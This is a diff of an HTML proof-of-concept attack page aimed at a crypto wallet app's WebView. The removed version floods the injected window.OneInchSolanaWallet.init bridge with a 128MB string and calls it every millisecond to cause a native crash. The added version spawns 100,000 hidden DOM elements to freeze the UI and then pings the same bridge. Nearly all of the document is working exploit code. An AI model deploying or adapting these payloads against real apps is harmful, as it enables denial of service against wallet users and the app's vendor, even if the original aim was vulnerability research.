@@ -2,53 +2,43 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Bridge Bypass</title>
+    <title>Business Logic Exploit: UI Lockout</title>
 </head>
-<body style="background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 40px;">
+<body style="background: #111; color: #fff; font-family: sans-serif; text-align: center; padding: 30px;">
 
-    <div style="border: 2px solid #00ff00; padding: 20px; border-radius: 15px; background: #111;">
-        <h2 style="color: #00ff00;">STABILITY TEST V3</h2>
-        <p style="font-size: 14px; color: #888;">Target: Solana Bridge Invocation</p>
+    <div style="border: 2px dashed #ff9500; padding: 20px; border-radius: 15px;">
+        <h2 style="color: #ff9500;">⚠️ UI LOCKOUT TEST</h2>
+        <p>Target: WebView Rendering Engine</p>
         
-        <button onclick="safeExecute()" style="padding: 20px; background: #00ff00; color: #000; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer;">
-            EXECUTE CALL
+        <button onclick="domOverload()" style="padding: 20px; background: #ff9500; color: #000; border: none; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer;">
+            EXECUTE DOM OVERLOAD
         </button>
 
-        <p id="status" style="margin-top: 20px; font-size: 12px; color: #aaa;">Status: Ready</p>
+        <p id="status" style="margin-top: 20px; font-size: 12px; color: #888;">Status: Ready</p>
     </div>
 
     <script>
-    function safeExecute() {
+    function domOverload() {
         const status = document.getElementById('status');
+        status.innerText = "Generating 100,000 elements...";
         
-        try {
-            // MENGGUNAKAN PEMANGGILAN LANGSUNG (Bukan Assignment)
-            // Ini untuk menghindari error 'readonly'
-            if (window.OneInchSolanaWallet && typeof window.OneInchSolanaWallet.init === 'function') {
-                
-                status.innerText = "Invoking bridge function...";
-                
-                // Payload raksasa untuk memicu Resource Exhaustion di sisi native
-                const junk = "A".repeat(128 * 1024 * 1024); // 128MB
-                
-                // HANYA MEMANGGIL, TIDAK MERUBAH PROPERTI
-                window.OneInchSolanaWallet.init(junk);
-
-                // Flooding dengan pemanggilan cepat
-                setInterval(() => {
-                    window.OneInchSolanaWallet.init("flood_" + Math.random());
-                }, 1);
-
-                status.innerText = "Call sent. Observe for crash...";
-            } else {
-                status.innerText = "Error: Bridge method not found.";
-            }
-        } catch (e) {
-            // Menampilkan error secara detail jika masih gagal
-            status.innerText = "Execution Log: " + e.message;
-            console.error(e);
+        // Loop masif untuk membebani Rendering Engine
+        for (let i = 0; i < 100000; i++) {
+            const el = document.createElement('div');
+            // Membuat elemen yang tidak terlihat tapi tetap harus dihitung oleh GPU/CPU
+            el.style.cssText = "position:fixed; width:1px; height:1px; opacity:0.01; z-index:-1;";
+            document.body.appendChild(el);
         }
+
+        // Setelah merusak UI, kita kirim sinyal ke bridge Solana yang tadi kita temukan
+        if (window.OneInchSolanaWallet) {
+            window.OneInchSolanaWallet.init("DOM_OVERLOAD_COMPLETE");
+        }
+
+        status.innerText = "DOM Flooded. Check app responsiveness.";
+        status.style.color = "#ff9500";
     }
     </script>
+
 </body>
 </html>
